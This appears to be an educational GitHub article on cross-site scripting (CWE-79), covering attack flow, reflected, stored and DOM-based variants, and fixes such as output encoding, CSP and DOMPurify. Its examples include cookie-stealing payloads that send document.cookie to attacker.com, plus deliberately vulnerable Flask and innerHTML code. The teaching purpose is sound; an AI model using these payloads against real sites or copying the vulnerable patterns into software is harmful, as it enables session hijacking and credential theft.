# CWE-79: Cross-Site Scripting (XSS)

> **2025 MITRE CWE Top 25 Ranking: #1 · Score: 60.38**  
> *More than double the score of #2 (SQL Injection at 28.72)*

---

## Table of Contents

- [What it is](#what-it-is)
- [Attack flow](#attack-flow)
- [Why it keeps happening](#why-it-keeps-happening)
- [The three variants](#the-three-variants)
- [Real-world impact](#real-world-impact)
- [Code examples](#code-examples)
- [How to fix it](#how-to-fix-it)
- [Key takeaway](#key-takeaway)
- [References](#references)

---

## What it is

Cross-Site Scripting (XSS) happens when an application takes **user-controlled input** and includes it in a web page without properly validating or encoding it — allowing an attacker to inject arbitrary JavaScript that executes in the victim's browser.

The browser has no way to distinguish between legitimate page scripts and injected ones. If your application puts untrusted data into the DOM without sanitizing it, the browser will execute it. No questions asked.

---

## Attack Flow

> 💡 *How Mallory injects a script that steals Alice's session — without ever touching Alice's machine directly.*

<!-- ═══════════════════════════════════════════════════════════════
     DIAGRAM — two ways to use this:
     1. GitHub  → save as diagrams/CWE-79-attack-flow.html,
                  open in browser, screenshot, embed as image below
     2. LinkedIn → screenshot the rendered diagram, upload as the
                  article cover / inline image
     ═══════════════════════════════════════════════════════════════ -->

<details>
<summary><strong>📊 View / copy diagram source HTML</strong></summary>

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@400;500;700&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;padding:1.5rem;font-family:'Space Grotesk',sans-serif}
.wrap{background:#0d1117;border-radius:12px;padding:2rem 1.5rem 1.5rem;color:#e6edf3;position:relative;overflow:hidden;border:1px solid #21262d}
.wrap::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#f78166,#ffa657,#79c0ff)}
.title-row{display:flex;align-items:center;gap:10px;margin-bottom:6px}
.cwe-badge{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;padding:3px 10px;border-radius:4px;background:#f78166;color:#0d1117;letter-spacing:.05em}
.rank-badge{font-size:11px;font-weight:500;padding:3px 10px;border-radius:4px;background:#1f2937;color:#ffa657;border:1px solid #374151}
.main-title{font-size:18px;font-weight:700;color:#e6edf3;margin-bottom:4px}
.sub{font-size:12px;color:#8b949e;margin-bottom:1.5rem;font-family:'JetBrains Mono',monospace}
.flow{display:grid;grid-template-columns:1fr 40px 1fr 40px 1fr;align-items:center;gap:0;margin-bottom:1.5rem}
.node{border-radius:10px;padding:14px 12px;text-align:center;border:1px solid}
.node-attacker{background:#1a0a0a;border-color:#f78166}
.node-server{background:#0a1628;border-color:#79c0ff}
.node-victim{background:#0a1a0a;border-color:#56d364}
.node-icon{font-size:26px;margin-bottom:6px;display:block}
.node-label{font-size:12px;font-weight:700;margin-bottom:4px}
.node-label.red{color:#f78166}
.node-label.blue{color:#79c0ff}
.node-label.green{color:#56d364}
.node-sub{font-size:10px;color:#8b949e;line-height:1.4}
.arrow{text-align:center;display:flex;flex-direction:column;align-items:center;gap:3px}
.arrow-line{width:100%;height:2px;background:linear-gradient(90deg,#f78166,#ffa657);position:relative}
.arrow-line::after{content:'▶';position:absolute;right:-6px;top:-7px;font-size:12px;color:#ffa657}
.arrow-label{font-size:9px;font-family:'JetBrains Mono',monospace;color:#ffa657;white-space:nowrap;background:#1a1208;padding:2px 6px;border-radius:3px;border:1px solid #374151}
.payload-box{background:#111827;border:1px solid #374151;border-radius:8px;padding:12px;margin-bottom:1.5rem}
.payload-title{font-size:10px;font-weight:700;color:#8b949e;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px;font-family:'JetBrains Mono',monospace}
.payload-code{font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.7}
.p-red{color:#f78166}.p-orange{color:#ffa657}.p-blue{color:#79c0ff}
.p-green{color:#56d364}.p-white{color:#e6edf3}.p-gray{color:#8b949e}
.impact-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:1rem}
.impact-item{background:#111827;border:1px solid #374151;border-radius:8px;padding:10px;text-align:center}
.impact-icon{font-size:18px;margin-bottom:4px;display:block}
.impact-label{font-size:11px;font-weight:700;color:#e6edf3;margin-bottom:2px}
.impact-sub{font-size:10px;color:#8b949e}
.footer{display:flex;justify-content:space-between;align-items:center;padding-top:10px;border-top:1px solid #21262d}
.footer-left{font-size:10px;color:#8b949e;font-family:'JetBrains Mono',monospace}
.score{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:#ffa657}
</style>
</head>
<body>
<div class="wrap">
  <div class="title-row">
    <span class="cwe-badge">CWE-79</span>
    <span class="rank-badge">🏆 Rank #1 — 2025</span>
  </div>
  <div class="main-title">Cross-Site Scripting (XSS) — Attack Flow</div>
  <div class="sub">Score: 60.38 &nbsp;·&nbsp; Based on 39,080 real CVEs &nbsp;·&nbsp; MITRE CWE Top 25 (2025)</div>
  <div class="flow">
    <div class="node node-attacker">
      <span class="node-icon">🎭</span>
      <div class="node-label red">Attacker (Mallory)</div>
      <div class="node-sub">Crafts a malicious script payload and injects it via user input</div>
    </div>
    <div class="arrow">
      <div class="arrow-label">POST /comment</div>
      <div class="arrow-line"></div>
    </div>
    <div class="node node-server">
      <span class="node-icon">🗄️</span>
      <div class="node-label blue">Web Server</div>
      <div class="node-sub">Stores payload without sanitization. Serves it to all users.</div>
    </div>
    <div class="arrow">
      <div class="arrow-label">GET /page → 💣</div>
      <div class="arrow-line"></div>
    </div>
    <div class="node node-victim">
      <span class="node-icon">👩</span>
      <div class="node-label green">Victim (Alice)</div>
      <div class="node-sub">Browser executes the injected script. Session stolen.</div>
    </div>
  </div>
  <div class="payload-box">
    <div class="payload-title">// The payload Mallory posted as a "message"</div>
    <div class="payload-code">
      <span class="p-gray">Login: </span><span class="p-white">Mallory</span><br>
      <span class="p-gray">Message: </span><span class="p-red">&lt;script&gt;</span><br>
      &nbsp;&nbsp;<span class="p-blue">fetch</span><span class="p-white">(</span><span class="p-green">'https://attacker.com/steal'</span><span class="p-white">, {</span><br>
      &nbsp;&nbsp;&nbsp;&nbsp;<span class="p-orange">method</span><span class="p-white">: </span><span class="p-green">'POST'</span><span class="p-white">,</span><br>
      &nbsp;&nbsp;&nbsp;&nbsp;<span class="p-orange">body</span><span class="p-white">: </span><span class="p-blue">document</span><span class="p-white">.</span><span class="p-orange">cookie</span>&nbsp;&nbsp;<span class="p-gray">// 🍪 Alice's session cookie</span><br>
      &nbsp;&nbsp;<span class="p-white">})</span><br>
      <span class="p-red">&lt;/script&gt;</span>
    </div>
  </div>
  <div class="impact-grid">
    <div class="impact-item"><span class="impact-icon">🍪</span><div class="impact-label">Session Hijack</div><div class="impact-sub">Steal cookies, impersonate Alice</div></div>
    <div class="impact-item"><span class="impact-icon">⌨️</span><div class="impact-label">Keylogging</div><div class="impact-sub">Capture every keystroke live</div></div>
    <div class="impact-item"><span class="impact-icon">🔑</span><div class="impact-label">Credential Theft</div><div class="impact-sub">Inject fake login form</div></div>
  </div>
  <div class="footer">
    <div class="footer-left">github.com/tanmaymish/cwe-chronicles</div>
    <div class="score">Score 60.38 — 2× higher than #2</div>
  </div>
</div>
</body>
</html>
```

</details>

---

## Why it keeps happening

OWASP has documented XSS since 2003. Every major framework has built-in protections. And yet CWE-79 has **never left the Top 4** in the entire history of the MITRE list.

The reasons are structural:

- **Web apps keep getting more complex** — more JavaScript, more third-party libraries, more dynamic rendering. Each addition is a potential injection point.
- **Third-party dependencies are a blind spot** — you secure your own code, but what about that analytics script, chat widget, or CDN-hosted library? A compromised dependency introduces XSS at scale.
- **Inconsistent input validation** — one unprotected field across thousands of endpoints is all it takes.
- **Framework misuse** — React's `dangerouslySetInnerHTML`, Angular's `bypassSecurityTrustHtml`, Vue's `v-html` are all ways developers accidentally bypass built-in sanitization.

---

## The three variants

### 1. Reflected XSS
The malicious script is injected via a URL parameter and immediately reflected back in the HTTP response. The victim clicks a crafted link, the script executes in their browser.

```
https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

**Impact:** Session hijacking, credential theft, phishing.

---

### 2. Stored XSS
The payload is saved to a database — a comment, username, profile bio, or support ticket — and executes every time that content is rendered for any user.

```html
<!-- Attacker posts this as a "comment" -->
<img src="x" onerror="fetch('https://attacker.com/log?c='+document.cookie)">
```

**Impact:** Widest blast radius. Every user who views the page is affected. Worm-capable.

---

### 3. DOM-based XSS
The vulnerability lives entirely in client-side JavaScript. The server never sees the payload — the browser processes it directly from the DOM.

```javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1);

// Attacker sends victim to:
// https://example.com/page#<img src=x onerror=alert(document.cookie)>
```

**Impact:** Invisible to server-side WAFs and logging. Harder to detect.

---

## Real-world impact

XSS isn't just "pop an alert box." In a real attack it enables:

| Attack | What happens |
|--------|-------------|
| Session hijacking | Steal `document.cookie`, impersonate the user entirely |
| Credential theft | Inject a fake login form that submits to attacker's server |
| Keylogging | Capture every keystroke on the page in real time |
| Malware distribution | Redirect users to exploit kits or force downloads |
| CSRF chaining | Use XSS foothold to perform state-changing requests |
| Account takeover | Modify email/password fields while user is authenticated |

In 2025, XSS has **7 entries in CISA's Known Exploited Vulnerabilities (KEV) catalog** — these are attacks actively happening in production systems right now, not theoretical exercises.

---

## Code examples

### ❌ Vulnerable

```python
# Flask — directly injecting user input into HTML
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f'<h1>Results for: {query}</h1>'  # Never do this
```

```javascript
// JavaScript — writing user input directly to DOM
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;  // XSS here
```

---

### ✅ Secure

```python
# Flask — Jinja2 auto-escapes by default
from flask import render_template, request

@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)  # Safe
```

```javascript
// Use textContent instead of innerHTML
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').textContent = 'Hello, ' + name;  // Safe
```

```javascript
// When you MUST render HTML — sanitize with DOMPurify first
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
document.getElementById('output').innerHTML = clean;  // Safe
```

---

## How to fix it

### 1. Output encoding — always
Encode all user-controlled data before rendering in an HTML context.

```
< → &lt;    > → &gt;    " → &quot;    ' → &#x27;    & → &amp;
```

Use **context-aware encoding** — HTML, JavaScript, and URL encoding are different.

---

### 2. Content Security Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

Use nonce-based or hash-based CSP. Avoid `unsafe-inline`.

---

### 3. Trust your framework's defaults

| Framework | Safe default | Dangerous bypass |
|-----------|-------------|-----------------|
| React | `{variable}` | `dangerouslySetInnerHTML` |
| Vue | `{{ variable }}` | `v-html` |
| Angular | `{{ variable }}` | `bypassSecurityTrustHtml` |
| Jinja2 | `{{ variable }}` | `\| safe` filter |

---

### 4. Sanitize rich HTML with DOMPurify

```javascript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHTML, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong'] });
```

---

### 5. HttpOnly and Secure cookie flags

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

---

### 6. Regular testing

- **SAST:** Semgrep, SonarQube, Bandit
- **DAST:** OWASP ZAP, Burp Suite
- **Manual:** grep for `innerHTML`, `dangerouslySetInnerHTML`, `eval()`, `document.write()`

---

## Key takeaway

XSS being #1 for the second consecutive year isn't a browser problem or a framework problem. It's a **developer awareness problem**.

The fix is not expensive. It doesn't require a dedicated security team. It requires:

1. Encoding your outputs
2. Trusting your framework's defaults
3. Treating every byte of user input as untrusted — always

Every web developer ships code that touches user input. This vulnerability is your responsibility.

---

## References

- [MITRE CWE-79 Official Entry](https://cwe.mitre.org/data/definitions/79.html)
- [MITRE CWE Top 25 (2025)](https://cwe.mitre.org/top25/archive/2025/2025_cwe_top25.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [DOMPurify](https://github.com/cure53/DOMPurify)

---

*Part of the [CWE Chronicles](../README.md) series — working through the 2025 MITRE CWE Top 25.*  
*Next: [CWE-89 — SQL Injection](./CWE-89-SQL-Injection.md)*
